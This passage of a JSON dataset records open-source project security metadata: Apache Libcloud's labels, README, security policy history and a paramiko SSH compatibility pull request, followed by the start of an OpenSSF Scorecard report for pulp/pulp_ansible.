            "drivers: common: google",
            "drivers: digitalocean",
            "drivers: digitalocean spaces",
            "drivers: docker",
            "drivers: ebs",
            "drivers: ec2",
            "drivers: equinix metal",
            "drivers: gandi",
            "drivers: gandi live",
            "drivers: gce",
            "drivers: gig g8",
            "drivers: gke",
            "drivers: google storage",
            "drivers: gridscale",
            "drivers: kamatera",
            "drivers: kubernetes",
            "drivers: kubevirt",
            "drivers: linode",
            "drivers: local storage",
            "drivers: lxd",
            "drivers: minio",
            "drivers: nsone",
            "drivers: oneandone",
            "drivers: openstack",
            "drivers: outscale",
            "drivers: ovh",
            "drivers: ovh storage",
            "drivers: packet",
            "drivers: powerdns",
            "drivers: scaleway",
            "drivers: softlayer",
            "drivers: vmware vcloud",
            "drivers: vultr",
            "external dependency",
            "feature flag",
            "feature request",
            "github",
            "github_actions",
            "integrations: github",
            "issue: bug",
            "javascript",
            "lint checks",
            "lint checks: black",
            "lint checks: codespell",
            "lint checks: dist install",
            "lint checks: isort",
            "mypy",
            "new driver",
            "os: windows",
            "packaging",
            "performance optimization",
            "potential 2.8.x candidate",
            "pricing data",
            "proposal / rfc",
            "pylint",
            "python",
            "python 2.x and 3.x compatibility",
            "python implementation: pypy",
            "python version compatibility",
            "readthedocs",
            "security",
            "setupy metadata",
            "stale",
            "status: cant reproduce",
            "status: needs cla",
            "status: needs documentation",
            "status: needs more info",
            "status: needs tests",
            "status: needs upgrade notes entry",
            "status: not an issue",
            "status: verified",
            "status: wip",
            "status: work in progress",
            "tests",
            "tests: dockerfile",
            "tests: integration",
            "tests: unit",
            "tool: sphinx",
            "travis ci",
            "type annotations",
            "website"
        ],
        "README_content": "Apache Libcloud - a unified interface for the cloud\n====================================================\n\nApache Libcloud is a Python library which hides differences between different\ncloud provider APIs and allows you to manage different cloud resources\nthrough a unified and easy to use API.\n\n\n.. image:: https://img.shields.io/badge/docs-latest-brightgreen.svg?style=flat\n        :target: https://libcloud.readthedocs.org\n\n.. image:: https://img.shields.io/pypi/v/apache-libcloud.svg\n        :target: https://pypi.python.org/pypi/apache-libcloud/\n\n.. image:: https://github.com/apache/libcloud/workflows/CI/badge.svg?branch=trunk\n        :target: https://github.com/apache/libcloud/actions?query=workflow%3ACI\n\n.. image:: https://github.com/apache/libcloud/actions/workflows/integration-tests.yml/badge.svg?branch=trunk\n        :target: https://github.com/apache/libcloud/actions/workflows/integration-tests.yml\n\n.. image:: https://github.com/apache/libcloud/workflows/Publish%20pricing.json%20to%20S3%20bucket/badge.svg?branch=trunk\n        :target: https://github.com/apache/libcloud/actions?query=workflow%3A%22Publish+pricing.json+to+S3+bucket%22\n\n.. image:: https://img.shields.io/codecov/c/github/apache/libcloud/trunk.svg\n        :target: https://codecov.io/github/apache/libcloud?branch=trunk\n\n.. image:: https://img.shields.io/pypi/pyversions/apache-libcloud.svg\n        :target: https://pypi.python.org/pypi/apache-libcloud/\n\n.. image:: https://img.shields.io/pypi/wheel/apache-libcloud.svg\n        :target: https://pypi.python.org/pypi/apache-libcloud/\n\n.. image:: https://img.shields.io/github/license/apache/libcloud.svg\n        :target: https://github.com/apache/libcloud/blob/trunk/LICENSE\n\n.. image:: https://img.shields.io/badge/code%20style-black-000000.svg\n        :target: https://black.readthedocs.io/en/stable/the_black_code_style/current_style.html\n\n.. image:: https://img.shields.io/pypi/dm/apache-libcloud\n        :target: https://pypi.org/project/apache-libcloud\n\n.. image:: https://bestpractices.coreinfrastructure.org/projects/152/badge\n        :target: https://bestpractices.coreinfrastructure.org/projects/152\n\n.. image:: https://img.shields.io/github/contributors/apache/libcloud.svg?logo=github\n        :target: https://github.com/apache/libcloud/graphs/contributors\n\n.. image:: https://img.shields.io/github/stars/apache/libcloud.svg?logo=github\n        :target: https://github.com/apache/libcloud/stargazers\n\n.. image:: https://img.shields.io/github/forks/apache/libcloud.svg?logo=github\n        :target: https://github.com/apache/libcloud/network/members\n\n.. image:: https://repology.org/badge/tiny-repos/python:apache-libcloud.svg\n        :target: https://repology.org/project/python:apache-libcloud/versions\n\n:Code:          https://github.com/apache/libcloud\n:License:       Apache 2.0; see LICENSE file\n:Issues:        https://issues.apache.org/jira/projects/LIBCLOUD/issues\n:Website:       https://libcloud.apache.org/\n:Documentation: https://libcloud.readthedocs.io\n:Supported Python Versions: Python >= 3.8, PyPy >= 3.8, Python 3.10 + Pyjion\n                            (Python 2.7 and Python 3.4 is supported by the\n                            v2.8.x release series, last version which supports\n                            Python 3.5 is v3.4.0, v3.6.x for Python 3.6, and\n                            v3.8.x for Python 3.7)\n\nResources you can manage with Libcloud are divided into the following categories:\n\n* **Compute** - Cloud Servers and Block Storage - services such as Amazon EC2 and Rackspace\n  Cloud Servers (``libcloud.compute.*``)\n* **Storage** - Cloud Object Storage and CDN  - services such as Amazon S3 and Rackspace\n  CloudFiles (``libcloud.storage.*``)\n* **Load Balancers** - Load Balancers as a Service, LBaaS (``libcloud.loadbalancer.*``)\n* **DNS** - DNS as a Service, DNSaaS (``libcloud.dns.*``)\n* **Container** - Container virtualization services (``libcloud.container.*``)\n\nApache Libcloud is an Apache project, see <http://libcloud.apache.org> for\nmore information.\n\nDocumentation\n=============\n\nDocumentation can be found at <https://libcloud.readthedocs.org>.\n\nNote on Python Version Compatibility\n====================================\n\nLibcloud supports Python >= 3.8 and PyPy >= 3.8.\n\n* Support for Python 3.7 has been dropped in v3.9.0 release.\n  Last release series which supports Python 3.6 is v3.6.x.\n* Support for Python 3.6 has been dropped in v3.7.0 release.\n  Last release series which supports Python 3.6 is v3.6.x.\n* Support for Python 3.5 has been dropped in v3.5.0 release.\n* Last release series which supports Python 3.5 is v3.4.x.\n* Support for Python 2.7 and 3.4 has been dropped in Libcloud v3.0.0 (last\n  release series which support Python 2.7 and Python 3.4 is v2.8.x).\n\nFeedback\n========\n\nPlease send feedback to the mailing list at <dev@libcloud.apache.org>,\nor Github repo at <https://github.com/apache/libcloud/issues>.\n\nContributing\n============\n\nFor information on how to contribute, please see the Contributing\nchapter in our documentation\n<https://libcloud.readthedocs.org/en/latest/development.html#contributing>.\n\nWebsite\n=======\n\nSource code for the website is available at\n<https://github.com/apache/libcloud-site>.\n\nLicense\n=======\n\nApache Libcloud is licensed under the Apache 2.0 license. For more information,\nplease see LICENSE_ and NOTICE_ file.\n\nSecurity\n========\n\nThis is a project of the `Apache Software Foundation <https://apache.org>`_ and\nfollows the ASF\n`vulnerability handling process <https://apache.org/security/#vulnerability-handling>`_.\n\nReporting a Vulnerability\n-------------------------\n\nTo report a new vulnerability you have discovered please follow the\n`ASF vulnerability reporting process <https://apache.org/security/#reporting-a-vulnerability>`_.\n\n.. _LICENSE: https://github.com/apache/libcloud/blob/trunk/LICENSE\n.. _NOTICE: https://github.com/apache/libcloud/blob/trunk/NOTICE\n",
        "num_commits": 10132,
        "project_age_days": 5436,
        "project_created_at": "2009-12-11",
        "latest_updated_at": "2024-10-26",
        "latest_pushed_at": "2024-09-04",
        "num_contributors": 324,
        "num_pull": 1826,
        "num_issues": 2035,
        "num_opening_issue": 92,
        "project_size(kB)": 35063,
        "num_stargazers": 2040,
        "num_watchers": 2040,
        "num_forks": 926,
        "num_subscribers": 84,
        "SecurityPolicy_created_at": "2013-10-29 21:45:51",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "c2db33f61d5c88892049f37e0ce7277df3426bfe",
                "url": "https://github.com/apache/libcloud/commit/c2db33f61d5c88892049f37e0ce7277df3426bfe",
                "date": "2019-06-08 08:13:02"
            },
            {
                "commit_id": "fa1a117c2f4f44889aaf94f900d1de3bfa68a23a",
                "url": "https://github.com/apache/libcloud/commit/fa1a117c2f4f44889aaf94f900d1de3bfa68a23a",
                "date": "2015-10-19 11:47:50"
            },
            {
                "commit_id": "06b81eac2345df7f5a46fc7726eddafd2b60243f",
                "url": "https://github.com/apache/libcloud/commit/06b81eac2345df7f5a46fc7726eddafd2b60243f",
                "date": "2015-10-13 12:19:18"
            },
            {
                "commit_id": "b3df2b2439e87f96f95be8e763dd64b7211db430",
                "url": "https://github.com/apache/libcloud/commit/b3df2b2439e87f96f95be8e763dd64b7211db430",
                "date": "2013-10-29 21:45:51"
            }
        ],
        "project_security_labels": [
            "security"
        ],
        "security_issues": [
            {
                "url": "https://github.com/apache/libcloud/pull/1685",
                "title": "Fix compatibility with paramiko >= 2.9.0 and older OpenSSH server versions",
                "labels": [
                    "api: compute",
                    "api: compute: ssh",
                    "api: compute: deploy node",
                    "api: compute: ssh: paramiko",
                    "security"
                ],
                "user": "Kami",
                "issue_author_association": "MEMBER",
                "number": 1685,
                "id": 1228421643,
                "state": "closed",
                "project_created_at": "2022-05-06T22:06:05Z",
                "closed_at": "2022-05-14T10:24:18Z",
                "body": "This pull request updates paramiko SSH connection related code so it works with paramiko >= 2.9.0 and older OpenSSH server versions which don't support SHA-2 variants of the RSA key verification algorithm.\r\n\r\n## Background, Context\r\n\r\nParamiko v2.9.0 introduced a change which adds support and prefers SHA-2 variants of the RSA key verification algorithm (https://github.com/paramiko/paramiko/blob/2.9.0/sites/www/changelog.rst#changelog).\r\n\r\nThis change is backward incompatible and won't work it user tries to use paramiko >= 2.9.0 with older OpenSSH servers such as the default setup on Ubuntu 14.04.\r\n\r\n## Proposed Soluton\r\n\r\nIn this PR I introduced a change to fall back to the previous / old approach in case \"authentication error\" is throw when connecting to the server when running paramiko >= 2.9.0. Sadly there is no easy way to catch and retry only on more granular / specific exception.\r\n\r\nThis way the code works and supports older and newer versions of paramiko and OpenSSH servers.\r\n\r\n## Note on Security\r\n\r\nFor security reasons, if user knows they will only connect to new OpenSSH versions which support those variants + ``MSG_EXT_INFO`` extension, they are encouraged to disable this compatibility change by setting ``LIBCLOUD_PARAMIKO_SHA2_BACKWARD_COMPATIBILITY`` environment variable to ``false``.",
                "comments": [
                    {
                        "body": "# [Codecov](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) Report\n> Merging [#1685](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) (2a58a1d) into [trunk](https://codecov.io/gh/apache/libcloud/commit/dd252cccc697a74b9860b94d5c6e1bf8d0f500f5?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) (dd252cc) will **decrease** coverage by `0.00%`.\n> The diff coverage is `46.15%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/apache/libcloud/pull/1685/graphs/tree.svg?width=650&height=150&src=pr&token=PYoduksh69&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation)](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation)\n\n```diff\n@@            Coverage Diff             @@\n##            trunk    #1685      +/-   ##\n==========================================\n- Coverage   83.25%   83.25%   -0.01%     \n==========================================\n  Files         400      400              \n  Lines       87321    87332      +11     \n  Branches     9284     9285       +1     \n==========================================\n+ Hits        72701    72706       +5     \n- Misses      11460    11466       +6     \n  Partials     3160     3160              \n```\n\n\n| [Impacted Files](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) | Coverage Δ | |\n|---|---|---|\n| [libcloud/compute/ssh.py](https://codecov.io/gh/apache/libcloud/pull/1685/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-bGliY2xvdWQvY29tcHV0ZS9zc2gucHk=) | `80.90% <46.15%> (-1.23%)` | :arrow_down: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation)\n> `Δ = absolute <relative> (impact)`, `ø = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=footer&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation). Last update [dd252cc...2a58a1d](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=lastupdated&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation).\n",
                        "user": "codecov-commenter",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-05-06T22:45:43Z",
                        "url": "https://github.com/apache/libcloud/pull/1685#issuecomment-1120060312"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/apache/libcloud/pulls/1685",
                    "merged_at": "2022-05-14T10:24:18Z"
                }
            }
        ],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 1,
        "num_security_issue_and_pull": 1,
        "security_issues_created_after_policy": [
            {
                "url": "https://github.com/apache/libcloud/pull/1685",
                "title": "Fix compatibility with paramiko >= 2.9.0 and older OpenSSH server versions",
                "labels": [
                    "api: compute",
                    "api: compute: ssh",
                    "api: compute: deploy node",
                    "api: compute: ssh: paramiko",
                    "security"
                ],
                "user": "Kami",
                "issue_author_association": "MEMBER",
                "number": 1685,
                "id": 1228421643,
                "state": "closed",
                "project_created_at": "2022-05-06T22:06:05Z",
                "closed_at": "2022-05-14T10:24:18Z",
                "body": "This pull request updates paramiko SSH connection related code so it works with paramiko >= 2.9.0 and older OpenSSH server versions which don't support SHA-2 variants of the RSA key verification algorithm.\r\n\r\n## Background, Context\r\n\r\nParamiko v2.9.0 introduced a change which adds support and prefers SHA-2 variants of the RSA key verification algorithm (https://github.com/paramiko/paramiko/blob/2.9.0/sites/www/changelog.rst#changelog).\r\n\r\nThis change is backward incompatible and won't work it user tries to use paramiko >= 2.9.0 with older OpenSSH servers such as the default setup on Ubuntu 14.04.\r\n\r\n## Proposed Soluton\r\n\r\nIn this PR I introduced a change to fall back to the previous / old approach in case \"authentication error\" is throw when connecting to the server when running paramiko >= 2.9.0. Sadly there is no easy way to catch and retry only on more granular / specific exception.\r\n\r\nThis way the code works and supports older and newer versions of paramiko and OpenSSH servers.\r\n\r\n## Note on Security\r\n\r\nFor security reasons, if user knows they will only connect to new OpenSSH versions which support those variants + ``MSG_EXT_INFO`` extension, they are encouraged to disable this compatibility change by setting ``LIBCLOUD_PARAMIKO_SHA2_BACKWARD_COMPATIBILITY`` environment variable to ``false``.",
                "comments": [
                    {
                        "body": "# [Codecov](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) Report\n> Merging [#1685](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) (2a58a1d) into [trunk](https://codecov.io/gh/apache/libcloud/commit/dd252cccc697a74b9860b94d5c6e1bf8d0f500f5?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) (dd252cc) will **decrease** coverage by `0.00%`.\n> The diff coverage is `46.15%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/apache/libcloud/pull/1685/graphs/tree.svg?width=650&height=150&src=pr&token=PYoduksh69&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation)](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation)\n\n```diff\n@@            Coverage Diff             @@\n##            trunk    #1685      +/-   ##\n==========================================\n- Coverage   83.25%   83.25%   -0.01%     \n==========================================\n  Files         400      400              \n  Lines       87321    87332      +11     \n  Branches     9284     9285       +1     \n==========================================\n+ Hits        72701    72706       +5     \n- Misses      11460    11466       +6     \n  Partials     3160     3160              \n```\n\n\n| [Impacted Files](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) | Coverage Δ | |\n|---|---|---|\n| [libcloud/compute/ssh.py](https://codecov.io/gh/apache/libcloud/pull/1685/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-bGliY2xvdWQvY29tcHV0ZS9zc2gucHk=) | `80.90% <46.15%> (-1.23%)` | :arrow_down: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation)\n> `Δ = absolute <relative> (impact)`, `ø = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=footer&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation). Last update [dd252cc...2a58a1d](https://codecov.io/gh/apache/libcloud/pull/1685?src=pr&el=lastupdated&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation).\n",
                        "user": "codecov-commenter",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-05-06T22:45:43Z",
                        "url": "https://github.com/apache/libcloud/pull/1685#issuecomment-1120060312"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/apache/libcloud/pulls/1685",
                    "merged_at": "2022-05-14T10:24:18Z"
                }
            }
        ],
        "SecurityPolicy_content_category": [],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 1,
        "has_generic_policy": false
    },
    {
        "project_name": "pulp/pulp_ansible",
        "project_url": "https://github.com/pulp/pulp_ansible",
        "SSF": {
            "date": "2024-10-30T00:45:44+07:00",
            "repo": {
                "name": "github.com/pulp/pulp_ansible",
                "commit": "b9bbba27ae86cc334fa89117ed4e4025c32303f2"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 7.5,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Info: status check found to merge onto on branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 8,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "21 out of 21 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: red hat contributor org/company found, python-wheel-build contributor org/company found, redhatofficial contributor org/company found, Azure contributor org/company found, RedHatInsights contributor org/company found, jctanner-org contributor org/company found, redhat inc contributor org/company found, theforeman contributor org/company found, microsoft contributor org/company found, microsoft @azure contributor org/company found, ansible contributor org/company found, ansible-community contributor org/company found, openshift contributor org/company found, pyjamasconf contributor org/company found, redhat-imaging contributor org/company found, FRCTeam3737 contributor org/company found, pulp contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 17 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: GNU General Public License v2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 1 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:26: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:59: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:78: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:87: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:105: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:73: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:37: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/create-branch.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/create-branch.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/create-branch.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/create-branch.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/create-branch.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/create-branch.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/create-branch.yml:87: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/create-branch.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/docs.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/docs.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/docs.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/lint.yml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/lint.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/lint.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/lint.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/nightly.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/nightly.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/nightly.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/nightly.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/nightly.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/nightly.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pr_checks.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/pr_checks.yml/main?enable=pin",
